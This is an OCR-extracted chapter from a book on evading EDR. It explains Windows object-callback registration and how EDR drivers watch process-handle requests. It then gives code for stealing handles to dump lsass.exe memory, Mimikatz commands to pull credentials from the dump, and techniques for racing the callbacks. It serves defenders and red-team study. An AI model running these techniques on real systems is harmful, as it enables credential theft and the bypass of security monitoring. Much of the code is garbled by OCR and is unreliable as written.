## 4  OBJECT NOTIFICATIONS

![Figure](figures/EvadingEDR_page_087_figure_001.png)

Process and thread events are only the tip of the iceberg when it comes to monitoring system activity with callback routines. In Windows, developers can also capture

requests for handles to objects, which provide valuable telemetry related to adversary activity.

Objects are a way to abstract resources such as files, processes, tokens, and registry keys. A centralized broker, aptly named the object manager , handles tasks like overseeing the creation and destruction of objects, keeping track of resource assignments, and managing an object's lifetime. In addition, the object manager notifies registered callbacks when code requests handles to processes, threads, and desktop objects. EDRs find these notifications useful because many attacker techniques, from credential dumping to remote process injection, involve opening such handles.

In this chapter, we explore one function of the object manager: its ability to notify drivers when certain types of object-related actions occur on the system. Then, of course, we discuss how attackers can evade these detection activities.

---

## How Object Notifications Work

As for all the other notification types, EDRs can register an object-callback routine using a single function, in this case, at10bRegisterCallbacks(). Let's take a look at this function to see how it works and then practice implementing an object-callback routine.

### Registering a New Callback

At first glance, the registration function seems simple, requiring only two pointers as parameters: the CallbackRegistration parameter, which specifies the callback routine itself and other registration information, and the

RegistrationHandle, which receives a value passed when the driver wishes to unregister the callback routine.

Despite the function's simple definition, the structure passed in via


the CallbackRegistration parameter is anything but. Listing 4-1 shows its


definition.

```bash
typedef struct _OB_CALLBACK_REGISTRATION {
  USHORT        Version;
  USHORT        OperationRegistrationCount;
  UNICODE_STRING    Altitude;
  PVOID         RegistrationContext;
  OB_OPERATION_REGISTRATION *OperationRegistration;
} OB_CALLBACK_REGISTRATION, *POB_CALLBACK_REGISTRATION;
Listing 4-1: The OB_CALLBACK_REGISTRATION structure definition
```

You'll find some of these values to be fairly straightforward. The version of the object-callback registration will always be OB_FLT_REGISTRATION_VERSION (0x0100). The OperationRegistrationCount member is the number of callback registration structures passed in the OperationRegistration member, and the RegistrationContext is some value passed as is to the callback routines whenever they are invoked and is set to null more often than not.

The Altitude member is a string indicating the order in which the callback routines should be invoked. A pre-operation routine with a higher altitude will run earlier, and a post-operation routine with a higher altitude will execute later. You can set this value to anything so long as the value isn't in use by another driver's routines. Thankfully, Microsoft allows the use of decimal numbers, rather than merely whole numbers, reducing the overall chances of altitude collisions.

This registration function centers on its OperationRegistration parameter and the array of registration structures it points to. This structure's definition is shown in Listing 4-2. Each structure in this array specifies whether the function is registering a pre-operation or post-operation callback routine.

```bash
typedef struct _OB_OPERATION_REGISTRATION {
  POBJET_TYPE = _-ObjectType;
  OB_OPERATION      Operations;
  POBJ_PRE_OPERATION_CALLBACK  PreOperation;
```

62    Chapter 4

---

```bash
POB_POST_OPERATION_CALLBACK PostOperation;
  } OPCODE_REGISTRATION, *POB_OPERATION_REGISTRATION;
```

Listing 4-2: The OB_OPERATION_REGISTRATION structure definition

Table 4-1 describes each member and its purpose. If you're curious about what exactly a driver is monitoring, these structures hold the bulk of the information in which you'll be interested.

Table 4-1: Members of the OB_OPERATION_REGISTRATION Structure

<table><tr><td>Member</td><td>Purpose</td></tr><tr><td>ObjectType</td><td>A pointer to the type of object the driver developer wishes to monitor. At the time of this writing, there are three supported values:  • PsProcessType (processes)  • PsThreadType (threads)  • ExDesktopObjectType (desktops)</td></tr><tr><td>Operations</td><td>A flag indicating the type of handle operation to be monitored. This can be either OB_OPERATION_HANDLE_CREATE, to monitor requests for new handles, or OB_OPERATION_HANDLE_DUPLICATE, to monitor handle-duplication requests.</td></tr><tr><td>PreOperation</td><td>A pointer to a pre-operation callback routine. This routine will be invoked before the handle operation completes.</td></tr><tr><td>PostOperation</td><td>A pointer to a post-operation callback routine. This routine will be invoked after the handle operation completes.</td></tr></table>


We'll discuss these members further in "Detecting a Driver's Actions Once Triggered" on page 66.

## Monitoring New and Duplicate Process-Handle Requests

EDRs commonly implement pre-operation callbacks to monitor new and duplicate process-handle requests. While monitoring thread- and desktophandle requests can also be useful, attackers request process handles more frequently, so they generally provide more relevant information. Listing 4-3 shows how an EDR might implement such a callback in a driver.

```bash
PVOID g_pObCallbackRegHandle;
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegPath)
{
   NTSTATUS status = STATUS_SUCCESS;
   OB_CALLBACK_REGISTRATION CallbackReg;
   OB_OPERATION_REGISTRATION OperationReg;
   RtlZeroMemory(&CallbackReg, sizeof(OB_CALLBACK_REGISTRATION));
   RtlZeroMemory(&OperationReg, sizeof(OB_OPERATION_REGISTRATION));
   --snip--
   CallbackReg.Version = OB_FLT_REGISTRATION_VERSION;
   OI CallbackReg.OperationRegistrationCount = 1;
```

---

```bash
RtlInitUnicodeString(&CallbackReg.Alitude, 0 "28133.08004");
   CallbackReg.RegistrationContext = NULL;
   OperationReg.ObjectType = 0 PsProcessType;
   OperationReg.Operations = 0 OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
   0 OperationReg.ProOperation = ObjectNotificationCallback;
   CallbackReg.OperationRegistration = 0 &OperationReg;
   status = 0 ObRegisterCallbacks(&CallbackReg, &g_pObCallbackRegHandle);
   if (INT_SUCCESS(status))
     {
     return status;
   }</td>
   --snip--
}</td>
OB_PREOP_CALLBACK_STATUS ObjectNotificationCallback(
  PVOID RegistrationContext,
  PUB_PRE_OPERATION_INFORMATION Info)
  {
     --snip--
}
```

Listing 4-3. Registering a pre-operation callback notification routine

In this example driver, we begin by populating the callback registration structure. The two most important members are OperationRegistrationCount, which we set to 1, indicating that we are registering only one callback routine ❶ and the altitude, which we set to an arbitrary value ❷ to avoid collisions with other drivers' routines.

Next, we set up the operation-registration structure. We set ObjectTree to PsProcessType ❶ and Operations to values that indicate we're interested in monitoring new or duplicate process-handle operations ❷. Lastly, we set our PreOperation member to point to our internal callback function ❸.

Finally, we tie our operation-registration structure into the callback registration structure by passing a pointer to it in the @operationRegistration member ❹ . At this point, we're ready to call the registration function ❸ . When this function completes, our callback routine will start receiving events, and we'll receive a value that we can pass to the registration function to unregrest the routine.

## Detecting Objects an EDR Is Monitoring

How can we detect which objects an EDR is monitoring? As with the other types of notifications, when a registration function is called, the system will add the callback routine to an array of routines. In the case of object callbacks, however, the array isn't quite as straightforward as others.

Remember those pointers we passed into the operation-registration structure to say what type of object we were interested in monitoring? So

64    Chapter 4

---

far in this book, we've mostly encountered pointers to structures, but these pointers instead reference values in an enumeration. Let's take a look at ntlPsProcessType to see what's going on. Object types like ntlPsProcessType are really OBJECT_TYPE structures. Listing 4-4 shows what these look like on a live system using the WinDbg debugger.

```bash
2: kd> dt nt!_OBJECT_TYPE poi(ntlPsProcessType)
+0x000 Typelist : _LIST_ENTRY [ 0xffffad8b'9ec8e220 - 0xffffad8b'9ec8e220 ]
+0x010 Name : _UNICODE_STRING "Process"
+0x020 DefaultObject : (null)
+0x028 Index : 0x7 ' '
+0x02c TotalNumberOfObjects : 0x7c
+0x030 TotalNumberOfHandles : 0x4ce
+0x034 HighWaterNumberOfObjects : 0x7d
+0x038 HighWaterNumberOfHandles : 0x4f1
+0x040 TypeInfo : _OBJECT_TYPE_INITIALLZER
+0x08B TypeLock : _EX_PUSH_LOCK
+0x0c0 Key : 0x63bf250
+0x0c8 CallbackList : _LIST_ENTRY [ 0xffff9708'64093680 - 0xffff9708'64093680 ]
Listing 4-4: The nt!_OBJECT_TYPE pointed to by nt!PsProcessType
```

The callbackList entry at offset 0x08E is particularly interesting to us, as it points to a LIST_ENTRY structure, which is the entry point, or header, of a doubly linked list of callback routines associated with the process object type. Each entry in the list points to an undocumented CALLBACK_ENTRY_ITEM structure. This structure's definition is included in Listing 4-5.

```bash
typedef struct _CALLBACK_ENTRY_ITEM {
    LIST_ENTRY_EntryItemList;
    OB_OPERATION Operations;
    DWORD Active;
    PCALLBACK_ENTRY CallbackEntry;
    POBJECT_TYPE ObjectType;
    POB_PRE_OPERATION_CALLBACK PreOperation;
    POB_POST_OPERATION_CALLBACK PostOperation;
    __int64 unk;
} CALLBACK_ENTRY_ITEM, * PCALLBACK_ENTRY_ITEM;
Listing 4-5: The CALLBACK_ENTRY_ITEM structure definition
```

The PreOperation member of this structure resides at offset 0x028. If we can traverse the linked list of callbacks and get the symbol at the address pointed to by this member in each structure, we can enumerate the drivers that are monitoring process-handle operations. WinDbg comes to the rescue once again, as it supports scripting to do exactly what we want, as demonstrated in Listing 4-6.

```bash
2:kd: llist -x ".if (poi((#s$extret+0x28) != 0) { lmDva (poi(#s$extret+0x28); }"
(poi(nt!PsProcessType)+0x08)
Browse full module list
start              end              module name
```

Object Notifications      65

---

```bash
ffffffff802 73b80000 ffff8f02 73bf2000 WdfFilter (no symbols)
   Loaded symbol image file: WdfFilter.sys
   ❸ Image path: \SystemBoot\system32\drivers\wd\WdfFilter.sys
       Image name: WdfFilter.sys
       Browse all global symbols functions data
       Image was built with /Brepo flag.
       Timestamp:     62950677 (This is a reproducible build file hash, not a timestamp)
       CheckSum:       00065F01
       ImageSize:       00072000
       Translations:    0000.04b0 0000.0464 0409.04b0 0409.04e4
       Information from resource tables:
```

Listing 4-6: Enumerating pre-operation callbacks for process-handle operations

This debugger command essentially says, "Traverse the linked list starting at the address pointed to by the CallbackList member of the nt!_0BJCTYPE structure for nt!PspProcessType, printing out the module information if the address pointed to by the PreOperation member is not null."

On my test system, Defender's WebFilter.sysn ❶ is the only driver with a registered callback. On a real system with an EDR deployed, you will almost certainly see the EDR's driver registered alongside Defender. You can use the same process to enumerate callbacks that monitor thread- or desktop-handle operations, but those are usually far less common. Additionally, if Microsoft were to add the ability to register callbacks for other types of object-handle operations, such as for tokens, this process could enumerate them as well.

## Detecting a Driver’s Actions Once Triggered

While you'll find it useful to know what types of objects an EDR is interested in monitoring, the most valuable piece of information is what the driver actually does when triggered. An EDR can do a bunch of things, from silently observing the code's activities to actively interfering with requests. To understand what the driver might do, we first need to look at the data with which it works.

When some handle operation invokes a registered callback, the callback will receive a pointer to either an OB_PRE_OPERATION_INFORMATION structure, if it is a pre-operation callback, or an OB_POST_OPERATION_INFORMATION structure, if it is a post-operation routine. These structures are very similar, but the post-operation version contains only the return code of the handle operation, and its data can't be changed. Pre-operation callbacks are far more prevalent because they offer the driver the ability to intercept and modify the handle operation. Therefore, we'll focus our attention on the pre-operation structure, shown in Listing 4-7.

```bash
typedef struct __OB_PRE_OPERATION_INFORMATION {
  OB_OPERATION           Operation;
  union {
    ULONG Flags;
    struct {
      ULONG KernelHandle : 1;
      ULONG Reserved : 31;
```

---

```bash
};
  };
  PVOID             Object;
  OBJECT_TYPE         ObjectType;
  PVOID             CallContext;
  POB_PRE_OPERATION_PARAMETERS Parameters;
  }OB_PRE_OPERATION_INFORMATION, *POB_PRE_OPERATION_INFORMATION;
```

Listing 4-7: The OB_PRE_OPERATION_INFORMATION structure definition

Just like the process of registering the callback, parsing the notification data is a little more complex than it looks. Let's step through the important pieces together. First, the Operation handle identifies whether the operation being performed is the creation of a new handle or the duplication of an existing one. An EDR's developer can use this handle to take different actions based on the type of operation it is processing. Also, if the KernelHandle value isn't zero, the handle is a kernel handle, and a callback function will rarely process it. This allows the EDR to further reduce the scope of events that it needs to monitor to provide effective coverage.

The Object pointer references the handle operation's target. The driver can use it to further investigate this target, such as to get information about its process. The Object Type pointer indicates whether the operation is targeting a process or a thread, and the Parameters pointer references a structure that indicates the type of operation being processed (either handle creation or duplication).

The driver uses pretty much everything in this structure leading up to the Parameters member to filter the operation. Once it knows what type of object it is working with and what types of operations it will be processing, it will rarely perform additional checks beyond figuring out whether the handle is a kernel handle. The real magic begins once we start processing the structure pointed to by the Parameters member. If the operation is for the creation of a new handle, we'll receive a pointer to the structure defined in Listing 4-8.

```bash
typedef struct _OB_PRE_CREATE_HANDLE_INFORMATION {
    ACCESS_MASK DesiredAccess;
    ACCESS_MASK OriginalDesiredAccess;
} OB_PRE_CREATE_HANDLE_INFORMATION, *POB_PRE_CREATE_HANDLE_INFORMATION;
```

Listing 4-8: The OB_PRE_CREATE_HANDLE_INFORMATION structure definition.

The two ACCESS_MASK values both specify the access rights to grant to the handle. These might be set to values like PROCESS_VM_OPERATION or THREAD _SET_THREAD_TOKEN, which might be passed to functions in the dwDesiredAccess parameter when opening a process or thread.

You may be wondering why this structure contains two copies of the same value. Well, the reason is that pre-operation notifications give the driver the ability to modify requests. Let's say the driver wants to prevent processes from reading the memory of the lsass.exe process. To read that

Object Notifications  67

---

process's memory, the attacker would first need to open a handle with the appropriate rights, so they might request PROCESS_ALL_ACCESS . The driver would receive this new process-handle notification and see the requested access mask in the structure's OriginalDesiredAccess member. To prevent the access, the driver could remove PROCESS_VM_READ by flipping the bit associated with this access right in the DesiredAccess member using the bitwise complement operator (-). Flipping this bit stops the handle from gaining that particular right but allows it to retain all the other requested rights.

If the operation is for the duplication of an existing handle, we'll receive a pointer to the structure defined in Listing 4-9, which includes two additional pointers.

```bash
typedef struct _OB_PRE_DUPLICATE_HANDLE_INFORMATION {
    ACCESS_MASK DesiredAccess;
    ACCESS_MASK OriginalDesiredAccess;
    PVOID      SourceProcess;
    PVOID       TargetProcess;
} OB_PRE_DUPLICATE_HANDLE_INFORMATION, *POB_PRE_DUPLICATE_HANDLE_INFORMATION;
```

Listing 4-9: The OB_PRE_DUPLICATE_HANDLE_INFORMATION structure definition

The SourceProcess member is a pointer to the process object from which the handle originated, and TargetProcess is a pointer to the process receiving the handle. These match the hSourceProcessHandle and hTargetProcessHandle parameters passed to the handle-duplication kernel function.

## Evading Object Callbacks During an Authentication Attack

Undeniably one of the processes that attackers target most often is lsass.exe, which is responsible for handling authentication in user mode. Its address space may contain cleartext authentication credentials that attackers can extract with tools such as Mimikatz, ProcDump, and even the Task Manager.

Because attackers have targeted bass.exe so extensively, security vendors have invested considerable time and effort into detecting its abuse. Objectcallback notifications are one of their strongest data sources for this purpose. To determine whether activity is malicious, many EDRs rely on three pieces of information passed to their callback routine on each new processhandle request: the process from which the request was made, the process for which the handle is being requested, and the access mask , or the rights requested by the calling process.

For example, when an operator requests a new process handle to laass.exe , the EDR's driver will determine the identity of the calling process and check whether the target is laass.exe . If so, it might evaluate the requested access rights to see whether the requestor asked for PROCESS_VM _READ , which it would need to read process memory. Next, if the requestor

68 Chapter 4

---

doesn't belong to a list of processes that should be able to access bass.exe, the driver might opt to return an invalid handle or one with a modified access mask and notify the agent of the potentially malicious behavior.

NOTE

Defenders can sometimes identify specific attacker tools based on the access masks requested. Many offensive tools request excessive access masks, such as PROCESS_ALL ACCESS, or atypical ones, such as Minikat's request for PROCESS_VM_READ | PROCESS QUERY_MORELIMITED_INFO, when opening process handles.

In summary, an EDR makes three assumptions in its detection strategy: that the calling process will open a new handle to Ioss.exe , that the process will be atypical, and that the requested access mask will allow the requestor to read Ioss.exe 's memory. Attackers might be able to use these assumptions to bypass the detection logic of the agent.

## Performing Handle Theft

One way attackers can evade detection is to duplicate a handle to /ass.exe owned by another process. They can discover these handles through the dllllibQuerySystemInformation() API, which provides an incredibly useful feature: the ability to view the system's handle table as an unprivileged user. This table contains a list of all the handles open on the systems, including objects such as mutexes, files, and, most importantly, processes. Listing 4-10 shows how malware might query this API.

```bash
PSYSTEM_HANDLE_INFORMATION GetSystemHandles()
{
  NTSTATUS status = STATUS_SUCCESS;
  PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
  ULONG ulSize = sizeof(System_HANDLE_INFORMATION);
  pHandleInfo = (SYSTEM_HANDLE_INFORMATION)malloc(ulSize);
  if (!pHandleInfo)
    {
      return NULL;
  }
  status = NtQuerySystemInformation(
    © SystemHandleInformation,
      pHandleInfo,
      ulSize, &ulSize);
  while (status == STATUS_INFO_LENGTH_MISMATCH)
    {
      free(pHandleInfo);
      pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(ulSize);
      status = NtQuerySystemInformation(
          SystemHandleInformation, 1
          © pHandleInfo,
          ulSize, &ulSize);
    }
```

---

```bash
if (status != STATUS_SUCCESS)
    {
      return NULL;
    }
}
```

Listing 4-10: Retrieving the table of handles

By passing the SystemHandleInformation information class to this function ❶ , the user can retrieve an array containing all the active handles on the system. After this function completes, it will store the array in a member variable of the SYSTEM_HANDLE_INFORMATION structure ❷ .

Next, the malware could iterate over the array of handles, as shown in Listing 4-11, and filter out those it can't use.

```bash
for (DWORD i = 0; i < pHandleInfo->NumberOfHHandles; i++)
{
    SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleInfo->Handles[i];
  ⃝ if (handleInfo.UniqueProcessId != g_dwlSassPid && handleInfo.UniqueProcessId != 4)
{
    HANDLE hTargetProcess = OpenProcess(
        PROCESS_DUP_HANDLE,
        FALSE,
        handleInfo.UniqueProcessId);
    if (hTargetProcess == NULL)
    {
        continue;
    }
    HANDLE hDuplicateHandle = NULL;
    if (!DuplicateHandle(
        hTargetProcess,
        (HANDLE)handleInfo.HandleValue,
        GetCurrentProcess(),
        &hDuplicateHandle,
        0, 0, DUPLICATE_SAME_ACCESS))
    {
        continue;
    }
    status = NtQueryObject(
        hDuplicateHandle,
        ObjectTypeInformation,
        NULL, 0, 8ulReturnLength);
    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInfo =
            (PUBLIC_OBJECT_TYPE_INFORMATION)malloc(ulReturnLength);
        if (pObjectTypeInfo)
        {
            break;
        }
    }
70    Chapter 4
```

---

```bash
status = NTQueryObject(
            hDuplicateHandle,
            ¤ ObjectTypeInformation,
            pObjectTypeInfo,
            ulReturnLength,
            &ulReturnLength);
        if (status != STATUS_SUCCESS)
            {
            continue;
            }
            ¤ if (!wcsicmp(pObjectTypeInfo->TypeName.Buffer, L"Process"))
            {
                --snip--
            }
            free(pObjectTypeInfo);
            }
        }
```

Listing 4-11: Filtering only for process handles

We first make sure that neither lsas.exe nor the system process owns the handle ❸ as this could trigger some alerting logic. We then call ndll1!t@00y0@00e(). passing in 00@00eTypeInformation ❸ to get the type of the object to which the handle belongs. Following this, we determine whether the handle is for a process object ❸ so that we can filter out all the other types, such as files and mutexes.

After completing this basic filtering, we need to investigate the handles a little more to make sure they have the access rights that we need to dump process memory. Listing 4-12 builds upon the previous code listing.

```bash
/************************************************************************************************
if (!wcslcmp(pObjectTypeInfo->TypeName.Buffer, L"Process"))
{
    LPWSTR szImageName = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
    DWORD dwSize = MAX_PATH * sizeof(WCHAR);
❶ if (QueryFullProcessImageNameW(hDuplicateHandle, 0, szImageName, &dwSize))
    {
        if (IsLsasHandle(szImageName) &&
                (handleEntryInfo.GrantedAccess & PROCESS_VM_READ) == PROCESS_VM_READ &&
                (handleEntryInfo.GrantedAccess & PROCESS_QUERY_INFORMATION) ==
                PROCESS_QUERY_INFORMATION)
        {
            HANDLE hOutFile = CreateFile(
                    L"C:\lisa.dmp",
                    GENERIC_WRITE,
                    0,
                    NULL,
                    CREATE_ALWAYS,
                    0, NULL);
```

Object Notifications      71

---

```bash
# if (MiniDumpWriteDump(
            hDuplicateHandle,
            dwClassPid,
            hOutFile,
            MiniDumpWithFullMemory,
            NULL, NULL, NULL))
        {
            break;
        }
        CloseHandle(hOutFile);
        }
    }
```

Listing 4-12: Evaluating duplicated handles and dumping memory

We first get the image name for the process ❶ and pass it to an internal function, Is.sas.handle(), which makes sure that the process handle is for lsass.exe . Next, we check the handle's access rights, looking for PROCESS_VM _READ and PROCESS_QUERY_INFORMATION , because the API we'll use to read lsass.exe 's process memory requires these. If we find an existing handle to lsass.exe with the required access rights, we pass the duplicated handle to the API and extract its information ❷ .

Using this new handle, we could create and process an lsass.exe memory dump with a tool such as Mimikatz. Listing 4-13 shows this workflow.

```bash
C:\> HandleDuplication.exe
LSASS PID: 884
[*] Found a handle with the required rights!
   Owner PID: 17600
   Handle Value: 0xff8
   Granted Access: 0xfffff
[*] Dumping LSASS memory to the DMP file...
[*] Dumped LSASS memory C:\lsa.dmp
C:\> mimikatz.exe
mimikatz # sekurlsa:minidump C:\lsa.dmp
Switch to MINIDUMP : 'C:\lsa.dmp'
mimikatz # sekurlsa:\logonpasswords
Opening : 'C:\lsa.dmp' file for minidump...
Authentication Id : 0 ; 6189696 (00000000:005e7280)
Session   : remoteInteractive from 2
User Name       : highpriv
Domain          : MILKWAY
Logon Server      : SUN
--snip--
```

Listing 4-13: Dumping lsass.exe's memory and processing the minidump with Mimikatz

---

As you can see, our tool determines that PID 17600, which corresponds to Process Explorer on my test host, had a handle to /usr.exe with the PROCESS_ALL_ACCESS access mask (0xFFFFF). We use this handle to dump the memory to a file. C:\lsa.mdp, Next, we run Mimikatz and use it to process the file, then use the sekunlsa:\logonpasswords command to extract credential material. Note that we could perform these Mimikatz steps offtarget to reduce our risk of detection, as we're working with a file and not live memory.

While this technique would evade certain sensors, an EDR could still detect our behavior in plenty of ways. Remember that object callbacks might receive notifications about duplication requests. Listing 4-14 shows what this detection logic could look like in an EDR's driver.

```bash
OB_PREOP_CALLBACK_STATUS ObjectNotificationCallback(
        PVOID RegistrationContext,
        POB_PRE_OPERATION_INFORMATION Info)
{    NTSTATUS status = STATUS_SUCCESS;
    } if (Info->ObjectType == *PsProcessType)
        {        if (Info->Operation == OB_OPERATION_HANDLE_DUPLICATE)
            {                UNICODE_STRING psTargetProcessName = HelperGetProcessName(
                    (PEPROCESSInfo->Object);
                    if (!psTargetProcessName))
                        {                            return OB_PREOP_SUCCESS;
                        }
            }
            UNICODE_STRING slsaProcessName = RTL_CONSTANT_STRING(L"Isass.exe");
        } if (FsRtlAreNamesEqual(psTargetProcessName, &slsaProcessName, TRUE, NULL))
            {                            --snip--
                            }
        }    }
    }    --snip--
}
```

Listing 4-14: Filtering handle-duplication events on the target process name

To detect duplication requests, the EDR could determine whether the Object type member of the OB_PRE_OPERATION_INFORMATION structure, which gets passed to the callback routine, is PsProcessType and, if so, whether its

Operation member is OB_OPERATION_HANDLE_DUPLICATE . Using additional filtering, we could determine whether we're potentially looking at the technique described earlier. We might then compare the name of the target process with the name of a sensitive process, or a list of them.

A driver that implements this check will detect process-handle duplication performed with kernel32!DuplicateHandle(). Figure 4-1 shows a mock EDR reporting the event.

---

![Figure](figures/EvadingEDR_page_100_figure_000.png)

Figure 4-1: Detecting process-handle duplication

Unfortunately, at the time of this writing, many sensors perform checks only on new handle requests and not on duplicate requests. This may change in the future, however, so always evaluate whether the EDR's driver performs this check.

## Racing the Callback Routine

In their 2020 paper "Fast and Furious: Outrunning Windows Kernel Notification Routines from User-Mode," Pierre Ciholas, José Miguel Such, Angelos K. Marnerides, Benjamin Green, Jiajie Zhang, and Utz Roedig demonstrated a novel approach to evading detection by object callbacks. Their technique involves requesting a handle to a process before execution has been passed to the driver's callback routine. The authors described two separate ways of facing callback routines, covered in the sections that follow.

### Creating a Job Object on the Parent Process

The first technique works in situations when an attacker wants to gain access to a process whose parent is known. For example, when a user double-clicks an application in the Windows GUI, its parent process should be explorer.exe. In those cases, the attacker definitively knows the parent of their target process, allowing them to use some Windows magic, which we'll discuss shortly, to open a handle to the target child process before the driver has time to act. Listing 4-15 shows this technique in action.

```bash
int main(int argc, char* argv[]) {
   {
    HANDLE hParent = INVALID_HANDLE_VALUE;
    HANDLE hIoCompletionPort = INVALID_HANDLE_VALUE;
    HANDLE hJob = INVALID_HANDLE_VALUE;
    JOBJECT_ASSOCiate_COMPLETION_PORT jobPort;
    HANDLE hThread = INVALID_HANDLE_VALUE;
   }--
   --snip--
   hParent = OpenProcess(PROCESS_ALL_ACCESS, true, atoi(argv[1]));
  ® hJob = CreateJobObjectW(nullptr, L"DriverRacer");
    hIoCompletionPort = ® CreateIoCompletionPort(
      INVALID_HANDLE_VALUE,
      nullptr,
      0, 0
    );
```

---

```bash
jobPort = JOBOBJECT_ASSOCIATE_COMPLETION_PORT{
      INVALID_HANDLE_VALUE,
      hIoCompletionPort
    };
  if (!SetInformationJobObject(
      hJob,
      JobObjectAssociateCompletionPortInformation,
      hJobPort,
      sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT)
    })
      return GetLastError();
    }
  if (!AssignProcessToJobObject(hJob, hParent))
    {
      return GetLastError();
    }
  hThread = CreateThread(
      nullptr, 0,
    0, (LPTHREAD_START_ROUTINE)GetChildHandles,
        hIoCompletionPort,
        0, nullptr
    );
  WaitForSingleObject(hThread, INFINITE);
  --snip--
```

Listing 4-15: Setting up a job object and I/O completion port to be queried

To gain a handle to a protected process, the operator creates a job object on the known parent ❶ . As a result, the process that placed the job object will be notified of any new child processes created through an I/O completion port ❷ . The malware process must then query this I/O completion port as quickly as possible. In our example, the internal GetChildHandles() function ❸ , expanded in Listing 4-16 , does just that.

```bash
void GetChildHandles(HANDLE* hIoCompletionPort)
    {   DWORD dwBytes = 0;
       ULONG_PTR lpKey = 0;
       LPOVERLAPPED lpOverlapped = nullptr;
       HANDLE hChild = INVALID_HANDLE_VALUE;
       WCHAR pszProcess[MAX_PATH];
    do
    {
        if (dwBytes == 6)
        {
          hChild = OpenProcess(
```

Object Notifications  75

---

```bash
PROCESS_ALL_ACCESS,
        true,
        ⓒ (DWORD)lpOverlapped
        );
        ⓒ GetModuleFileNameExW(
            hChild,
            nullptr,
            pszProcess,
            MAX_PATH
        );
        wprintf(L"New child handle:\n"
            "PID: %u\n"
            "Handle: %#n"
            "Name: %ls\n\n",
            DWORD(lpOverlapped},
            hChild,
            pszProcess
        );
        }
    ⓒ } while (GetQueuedCompletionStatus(
        *hIoCompletionPort,
        8dwBytes,
        &ipKey,
        &lpOverlapped,
        INFINITE));
    }
```

Listing 4-16: Opening new process handles

In this function, we first check the I/O completion port in a db...while loop ❸. If we see that bytes have been transferred as part of a completed operation, we open a new handle to the returned PID ❸, requesting full rights (in other words, PROCESS_ALL_ACCESS). If we receive a handle, we check its image name ❸. Real malware would do something with this handle, such as read its memory or terminate it, but here we just print some information about it instead.

This technique works because the notification to the job object occurs before the object-callback notification in the kernel. In their paper, the researchers measured the time between process-creation and objectcallback notification to be 8.75–14.5 ms. This means that if a handle is requested before the notification is passed to the driver, the attacker can obtain a fully privileged handle as opposed to one whose access mask has been changed by the driver.

## Guessing the PID of the Target Process

The second technique described in the paper attempts to predict the PID of the target process. By removing all known PIDs and thread IDs (TIDs) from the list of potential PIDs, the authors showed that it is possible to

---

more efficiently guess the PID of the target process. To demonstrate this, they created a proof-of-concept program called hThermAll.cpp. At the core of their tool is the internal function OpenProcessThermAll(), shown in Listing 4-17, which the program executes across four concurrent threads to open process handles.

```bash
void OpenProcessThemAll{
   const DWORD dwBasePld,
   const DWORD dwWbrPids,
   std::list<HANDLE[]> lhProcesses,
   const std::vector<DWORD>* vwExistingPids)
  {
   std::list<DWORD> pids;
   for (auto i() ; i < dwWbrPids; i += 4)
      if (!std::binary_search(
          vwExistingPids->begin(),
          vwExistingPids->end(),
          dwBasePld + 1))
      {
         pids.push_back(dwBasePld + i);
      }
   while (!bJoinThreads) {
      for (auto it = pids.begin(); it != pids.end(); ++it)
      {
       ● if (const auto hProcess = OpenProcess(
            DESIRED_ACCESS,
            DESIRED_INHERITANCE,
            *it))
            {
             EnterCriticalSection(&criticalSection);
             ● lhProcesses->push_back(hProcess);
             leaveCriticalSection(&criticalSection);
             pids.erase(it);
        }
      }
    }
```

Listing 4-17 The OpenProcessThemAll() function used to request handles to processes and check their PIDs

This function indiscriminately requests handles to all processes via their PIDs in a filtered list. If the handle returned is valid, it is added to an array . After this function completes, we can check whether any of the handles returned match the target process. If the handle does not match the target, it is closed.

While the proof of concept is functional, it misses some edge cases, such as the reuse of process and thread identifiers by another process or thread after one terminates. It is absolutely possible to cover these, but no public examples of doing so exist at the time of this writing.

Both of these techniques' operational use cases may also be limited.

For instance, if we wanted to use the first technique to open a handle to the

Object Notifications 77

---

agent process, we'd need to run our code before that process starts. This would be very challenging to pull off on a real system because most EDRs start their agent process via a service that runs early in the boot order. We'd need administrative rights to create our own service, and that still doesn't guarantee that we'd be able to get our malware running before the agent service starts.

Additionally, both techniques focus on defeating the EDR's preventive controls and do not take into consideration its detective controls. Even if the driver is unable to modify the privileges of the requested handle, it might still report suspicious process-access events. Microsoft has stated that it won't fix this issue, as doing so could cause application-compatibility problems; instead, third-party developers are responsible for mitigation.

## Conclusion

Monitoring handle operations, especially handles being opened to sensitive processes, provides a robust way to detect adversary tradecraft. A driver with a registered object-notification callback stands directly inline of an adversary whose tactics rely on opening or duplicating handles to things such as loas.exe. When this callback routine is implemented well, the opportunities for evading this sensor are limited, and many attackers have adapted their tradecraft to limit the need to open new handles to processes altogether.

78    Chapter 4

---

